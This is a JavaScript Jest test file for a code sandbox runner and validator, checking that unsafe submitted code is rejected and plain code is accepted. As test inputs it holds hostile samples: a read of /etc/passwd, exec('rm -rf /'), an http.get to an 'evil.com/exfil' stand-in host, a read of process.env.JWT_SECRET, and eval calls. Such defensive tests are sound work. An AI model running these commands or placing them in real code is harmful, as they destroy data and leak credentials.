const SandboxRunner = require('../utils/sandboxRunner');
const SandboxValidator = require('../utils/sandboxValidator');

describe('Sandbox Runner', () => {
  it('should run JS code securely', async () => {
    const res = await SandboxRunner.runCode('console.log("secure");');
    expect(res.output).toContain('secure');
  });
});

describe('SandboxValidator', () => {

  describe('blocked module detection', () => {
    it('should reject code that imports the fs module', () => {
      const code = `const fs = require('fs');\nfs.readFileSync('/etc/passwd');`;
      const result = SandboxValidator.validate(code, 'javascript');

      expect(result.safe).toBe(false);
      expect(result.violations.length).toBeGreaterThanOrEqual(1);

      const ruleNames = result.violations.map(v => v.rule);
      expect(
        ruleNames.includes('blocked_module_import') || ruleNames.includes('blocked_module_explicit')
      ).toBe(true);
    });

    it('should reject code that spawns child processes', () => {
      const code = `const { exec } = require('child_process');\nexec('rm -rf /');`;
      const result = SandboxValidator.validate(code, 'javascript');

      expect(result.safe).toBe(false);

      const ruleNames = result.violations.map(v => v.rule);
      expect(
        ruleNames.includes('blocked_module_import') || ruleNames.includes('blocked_module_explicit')
      ).toBe(true);
    });

    it('should reject code that opens network connections', () => {
      const code = `const http = require('http');\nhttp.get('http://evil.com/exfil');`;
      const result = SandboxValidator.validate(code, 'javascript');

      expect(result.safe).toBe(false);
    });
  });

  describe('process object access detection', () => {
    it('should reject code that reads environment variables', () => {
      const code = `const secret = process.env.JWT_SECRET;\nconsole.log(secret);`;
      const result = SandboxValidator.validate(code, 'javascript');

      expect(result.safe).toBe(false);
      expect(result.violations.some(v => v.rule === 'process_access')).toBe(true);
    });

    it('should reject code that calls process.exit', () => {
      const code = `process.exit(1);`;
      const result = SandboxValidator.validate(code, 'javascript');

      expect(result.safe).toBe(false);
      expect(result.violations.some(v => v.rule === 'process_access')).toBe(true);
    });
  });

  describe('eval and dynamic execution detection', () => {
    it('should reject code that uses eval()', () => {
      const code = `const userInput = 'console.log("hacked")';\neval(userInput);`;
      const result = SandboxValidator.validate(code, 'javascript');

      expect(result.safe).toBe(false);
      expect(result.violations.some(v => v.rule === 'eval_call')).toBe(true);
    });

    it('should reject code that uses the Function constructor', () => {
      const code = `const fn = new Function('return process.env');\nfn();`;
      const result = SandboxValidator.validate(code, 'javascript');

      expect(result.safe).toBe(false);
      expect(result.violations.some(v => v.rule === 'function_constructor')).toBe(true);
    });
  });

  describe('safe code acceptance', () => {
    it('should allow basic arithmetic code', () => {
      const code = `function add(a, b) {\n  return a + b;\n}\nconsole.log(add(2, 3));`;
      const result = SandboxValidator.validate(code, 'javascript');

      expect(result.safe).toBe(true);
      expect(result.violations).toHaveLength(0);
    });

    it('should allow array manipulation code', () => {
      const code = `const nums = [5, 3, 8, 1, 9];\nnums.sort((a, b) => a - b);\nconsole.log(nums);`;
      const result = SandboxValidator.validate(code, 'javascript');

      expect(result.safe).toBe(true);
      expect(result.violations).toHaveLength(0);
    });

    it('should allow string processing code', () => {
      const code = `function reverseString(str) {\n  return str.split('').reverse().join('');\n}\nconsole.log(reverseString('hello'));`;
      const result = SandboxValidator.validate(code, 'javascript');

      expect(result.safe).toBe(true);
      expect(result.violations).toHaveLength(0);
    });
  });

  describe('edge cases', () => {
    it('should reject empty submissions', () => {
      const result = SandboxValidator.validate('', 'javascript');
      expect(result.safe).toBe(false);
    });

    it('should reject null code input', () => {
      const result = SandboxValidator.validate(null, 'javascript');
      expect(result.safe).toBe(false);
    });

    it('should flag unsupported languages', () => {
      const code = `print("hello world")`;
      const result = SandboxValidator.validate(code, 'brainfuck');

      expect(result.safe).toBe(false);
      expect(result.violations.some(v => v.rule === 'unsupported_language')).toBe(true);
    });

    it('should provide validation metadata in the result', () => {
      const code = `console.log("test");`;
      const result = SandboxValidator.validate(code, 'javascript');

      expect(result.meta).toBeDefined();
      expect(result.meta.codeLength).toBe(code.length);
      expect(result.meta.language).toBe('javascript');
      expect(result.meta.patternsChecked).toBeGreaterThan(0);
    });

    it('isSafe helper should return boolean', () => {
      expect(SandboxValidator.isSafe('console.log(1)', 'javascript')).toBe(true);
      expect(SandboxValidator.isSafe("require('fs')", 'javascript')).toBe(false);
    });
  });
});
